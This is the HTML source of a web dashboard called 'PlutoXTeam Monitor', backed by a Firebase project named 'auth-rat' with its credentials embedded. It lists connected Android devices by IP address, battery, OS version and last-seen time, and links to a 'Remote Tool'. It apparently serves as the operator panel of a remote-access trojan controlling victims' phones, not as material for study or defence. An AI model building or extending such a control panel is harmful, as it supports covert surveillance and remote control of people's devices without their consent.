<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PlutoXTeam Monitor</title>

    <link rel="stylesheet" href="css/style.css">

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap"
        rel="stylesheet">

    <!-- FIREBASE (COMPAT) -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

    <script src="js/theme.js"></script>

    <!-- FIREBASE INIT + AUTH GUARD -->
    <script>
        firebase.initializeApp({
            apiKey: "AIzaSyCg5jaxHtALGbHssWD6sk7EklZsj3EFSLk",
            authDomain: "auth-rat.firebaseapp.com",
            projectId: "auth-rat",
            storageBucket: "auth-rat.appspot.com",
            messagingSenderId: "211012554206",
            appId: "1:211012554206:web:f0697a1b9289659754a14f"
        });

        const auth = firebase.auth();

        /* ===== AUTH GUARD ===== */
        auth.onAuthStateChanged(user => {
            if (!user) {
                location.replace("login.html");
            }
        });
    </script>
</head>

<body>

    <div class="layout">
        <div class="sidebar-overlay"></div>

        <aside class="sidebar">
            <a href="index.html" class="brand">
                <img src="img/logo.jpg" alt="PlutoXTeam"
                    style="height:32px;width:32px;border-radius:6px;object-fit:cover;">
                PlutoXTeam
            </a>

            <div class="nav-title">Main</div>
            <a href="index.html" class="nav-link active">All Devices</a>
            <a href="#" class="nav-link">Dashboard</a>
            <a href="remote.html" class="nav-link">Remote Tool</a>
        </aside>

        <main class="content">

            <!-- HEADER -->
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:2rem;">
                <h1>Dashboard</h1>

                <!-- LOGOUT -->
                <button id="logoutBtn"
                    style="background:#ef4444;color:#fff;border:none;padding:8px 14px;border-radius:6px;cursor:pointer;">
                    Logout
                </button>
            </div>

            <div id="connection-status" class="status-badge">Connecting...</div>

            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-value" id="total-devices">0</div>
                    <div class="stat-label">Total Devices</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="online-devices">0</div>
                    <div class="stat-label">Online</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="offline-devices">0</div>
                    <div class="stat-label">Offline</div>
                </div>
            </div>

            <div class="card">
                <h2>Connected Devices</h2>
                <div class="table-container">
                    <table>
                        <thead>
                            <tr>
                                <th>Status</th>
                                <th>Device Name</th>
                                <th>Android Ver</th>
                                <th>Battery</th>
                                <th>IP Address</th>
                                <th>Last Seen</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="devices-table-body">
                            <tr>
                                <td colspan="7" style="text-align:center;">Loading devices...</td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>

        </main>
    </div>

    <div class="footer">Powered by PlutoXTeam</div>

    <!-- APP -->
    <script src="js/firebase_config.js"></script>
    <script src="js/ui.js"></script>
    <script src="js/app.js"></script>

    <!-- LOGOUT LOGIC -->
    <script>
        document.getElementById("logoutBtn").onclick = () => {
            auth.signOut().then(() => {
                location.replace("login.html");
            });
        };
    </script>

</body>
</html>
